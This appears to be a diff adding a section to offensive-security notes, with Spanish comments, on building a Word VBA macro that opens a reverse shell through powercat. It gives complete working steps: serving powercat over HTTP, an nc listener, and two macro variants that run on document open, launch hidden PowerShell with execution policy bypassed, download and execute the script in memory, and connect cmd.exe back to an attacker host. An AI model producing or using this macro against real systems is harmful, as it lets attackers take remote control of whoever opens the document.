@@ -641,6 +641,79 @@ End Sub
 #### VBA Reverse Shell Macro with Powercat
 
 ```bash
+# Qué es Powercat
+# Script de PowerShell (netcat "nativo" en PS) que permite crear reverse/bind shells
+# Repo oficial: https://github.com/besimorhino/powercat
+
+# Flujo
+# 1. Clonar powercat y servirlo via HTTP
+# 2. La macro VBA descarga powercat.ps1 en memoria (IEX) y lo ejecuta
+# 3. Powercat abre conexión reversa hacia el listener (nc) en Kali
+
+# Paso 1 — Clonar powercat
+cd Desktop
+git clone https://github.com/besimorhino/powercat.git
+
+# Paso 2 — Servir el script via HTTP
+cd powercat
+sudo python3 -m http.server 8080
+
+# Paso 3 — Listener netcat
+nc -nvlp 1337
+
+# Paso 4 — Macro VBA en el documento Word
+Sub AutoOpen()
+    powercat
+End Sub
+Sub Document_Open()
+    powercat
+End Sub
+Sub powercat()
+    Dim url As String
+    Dim psScript As String
+    url = "http://<ip_kali>:8080/powercat.ps1"
+    ' IEX descarga y ejecuta el script en memoria (sin tocar disco)
+    ' -c LHOST -p LPORT -e cmd → reverse shell ejecutando cmd.exe
+    psScript = "IEX (New-Object System.Net.WebClient).DownloadString('" & url & "'); powercat -c <ip_kali> -p 1337 -e cmd"
+    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """", vbHide
+End Sub
+
+# Variante 2 — Powercat con generación previa del comando (pwsh -c)
+
+# Diferencia clave con la variante anterior:
+# En vez de escribir el psScript "a mano" dentro de la macro,
+# se genera el comando completo desde Kali con pwsh -c,
+# se redirige la salida a un archivo (reverse-shell.txt),
+# y de ahí se copia/decodifica para meterlo en la macro VBA.
+# Sirve para verificar que la sintaxis del comando esté bien
+# antes de pegarla en el VBA (evita errores de comillas/escaping).
+
+LHOST=<ip_kali>
+LPORT=1337
+
+# Genera el comando y lo guarda en un txt para revisarlo
+pwsh -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c $LHOST -p $LPORT -e cmd.exe -g" > /tmp/reverse-shell.txt
+
+# Servir powercat.ps1 via HTTP
+sudo python3 -m http.server 8080
+
+# Listener
+nc -nvlp 1337
+
+# Macro VBA (mismo patrón que la variante 1)
+Sub AutoOpen()
+    powercat
+End Sub
+Sub Document_Open()
+    powercat
+End Sub
+Sub powercat()
+    Dim url As String
+    Dim psScript As String
+    url = "http://<ip_kali>:8080/powercat.ps1"
+    psScript = "IEX (New-Object System.Net.WebClient).DownloadString('" & url & "'); powercat -c <ip_kali> -p 1337 -e cmd.exe -g"
+    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """", vbHide
+End Sub
 ```
 
 #### Using ActiveX Controls for Macro Execution
